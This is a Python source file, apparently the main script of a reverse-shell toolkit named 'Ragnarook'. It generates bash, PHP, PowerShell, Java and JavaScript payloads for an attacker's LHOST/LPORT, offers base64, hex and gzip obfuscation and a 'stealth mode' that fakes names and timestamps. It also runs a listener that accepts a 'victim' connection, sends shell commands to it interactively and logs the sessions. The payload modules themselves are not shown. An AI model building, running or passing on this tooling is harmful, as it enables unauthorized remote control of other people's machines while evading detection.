import os
import json
import socket
import argparse
from colorama import Fore, init, Back
from datetime import datetime

# Payload modules
from payloads import bash, php, powershell, java, js
from session_logger import log_session  # custom logger

init(autoreset=True)

def banner():
    print(f"""{Back.BLUE}{Fore.BLACK}
 Ragnarook — powered by Python 

 Modes:
  \t [1] manual> Select payload and configure manually
  \t [2] silent> Use config.json to generate silently
  \t [3] batch> Generate all payloads in one go
  \t [4] autorun> Autoload from config and generate
  {Fore.RED}\t [5] exploit> Start listener and interact with target """)

def load_config():
    try:
        with open("config.json", "r") as f:
            return json.load(f)
    except Exception as e:
        print(f"{Fore.RED}Failed to read config: {e}")
        return {}

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "0.0.0.0"

def save_last_config(lang_name, ip, port, obf, stealth):
    """Save last manual settings to last_config.json"""
    data = {
        "language": lang_name,
        "lhost": ip,
        "lport": port,
        "obfuscation": obf,
        "stealth": stealth
    }
    with open("last_config.json", "w") as f:
        json.dump(data, f, indent=2)
    print(f"{Fore.GREEN}[+] Last configuration saved to last_config.json")

def manual_mode():
    print(f"\n{Fore.YELLOW}✳ Choose payload type:")
    print("[1] Bash  \n[2] Java \n[3] PowerShell \n[4] JavaScript \n[5] PHP")
    choice = input("Select number: ").strip()
    
    # Map choice to language name and module
    lang_map = {
        '1': ('bash', bash),
        '2': ('java', java),
        '3': ('powershell', powershell),
        '4': ('js', js),
        '5': ('php', php)
    }
    if choice not in lang_map:
        print(f"{Fore.RED}Invalid selection.")
        return
    lang_name, lang_module = lang_map[choice]
    
    ip = input("LHOST: ").strip()
    port = input("LPORT: ").strip()
    if not ip or not port:
        print(f"{Fore.RED}LHOST and LPORT are required.")
        return

    print(f"\n Obfuscation Options:")
    print(Fore.YELLOW + f"  [0] No obfuscation")
    print(Fore.YELLOW + f"  [1] Base64")
    print(Fore.YELLOW + f"  [2] Base64 + Hex")
    print(Fore.YELLOW + f"  [3] gzip + Base64")
    obfuscation_choice = input(Fore.YELLOW + f"Select obfuscation method [0–3]: ").strip()
    stealth = input(" Enable stealth mode (fake name & timestamp)? (y/n): ").strip().lower() == "y"
    
    # Save last configuration
    save_last_config(lang_name, ip, port, obfuscation_choice, stealth)
    
    # Generate payload
    lang_module.generate_manual(ip, port, obfuscation=obfuscation_choice, stealth=stealth)

def silent_mode(config):
    lang = config.get("language")
    ip = config.get("lhost")
    port = config.get("lport")
    obfuscation = config.get("obfuscation", "0")
    stealth = config.get("stealth", False)
    run_payload(lang, ip, port, obfuscation, stealth)

def batch_mode():
    ip = input("LHOST (used for all payloads): ").strip()
    port = input("LPORT: ").strip()
    obfuscation = input("Obfuscation level [0–3]: ").strip()
    stealth = input("Enable stealth mode? (y/n): ").strip().lower() == "y"
    for module in [bash, php, powershell, java, js]:
        module.generate_manual(ip, port, obfuscation=obfuscation, stealth=stealth)
    print(f"{Fore.GREEN}All payloads generated and saved.")

def autorun_mode():
    print(f"{Fore.MAGENTA} Autorun mode enabled...")
    config = load_config()
    lang = config.get("language")
    ip = config.get("lhost")
    port = config.get("lport")
    obfuscation = config.get("obfuscation", "0")
    stealth = config.get("stealth", False)
    run_payload(lang, ip, port, obfuscation, stealth)

def run_payload(lang, ip, port, obfuscation="0", stealth=False):
    modules = {
        "bash": bash,
        "php": php,
        "powershell": powershell,
        "java": java,
        "js": js
    }
    module = modules.get(lang.lower())
    if module:
        module.generate_manual(ip, port, obfuscation=obfuscation, stealth=stealth)
    else:
        print(f"{Fore.RED}Unsupported language: {lang}")

def exploit_mode():
    suggested_ip = get_local_ip()
    host = input(f"{Fore.YELLOW}Enter LHOST to listen on (default {suggested_ip}): ").strip()
    if not host:
        host = suggested_ip

    try:
        port = int(input(f"{Fore.YELLOW}Enter LPORT to listen on (default 4444): ").strip() or "4444")
    except ValueError:
        print(f"{Fore.RED}Invalid input. Using default port 4444.")
        port = 4444

    print(f"{Fore.YELLOW} Waiting for connection on {host}:{port}...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.bind((host, port))
        s.listen(1)
        conn, addr = s.accept()
        victim_ip = addr[0]
        print(f"{Fore.GREEN} Connection from {victim_ip}:{addr[1]} established.")
    except Exception as e:
        print(f"{Fore.RED}Failed to bind: {e}")
        return

    try:
        while True:
            cmd = input(" Shell> ").strip()
            if cmd.lower() in ["exit", "quit"]:
                conn.send(b"exit")
                break
            conn.send(cmd.encode())
            result = conn.recv(8192).decode()
            print(result)
            log_session(victim_ip, cmd, result)
    except Exception as e:
        print(f"{Fore.RED} Error during session: {e}")
    finally:
        conn.close()

def main():
    banner()
    mode = input(f"{Fore.CYAN} Select mode [1–5]: ").strip()

    if mode == "1":
        manual_mode()
    elif mode == "2":
        config = load_config()
        silent_mode(config)
    elif mode == "3":
        batch_mode()
    elif mode == "4":
        autorun_mode()
    elif mode == "5":
        exploit_mode()
    else:
        print(f"{Fore.RED} Unknown mode.")

if __name__ == "__main__":
    main()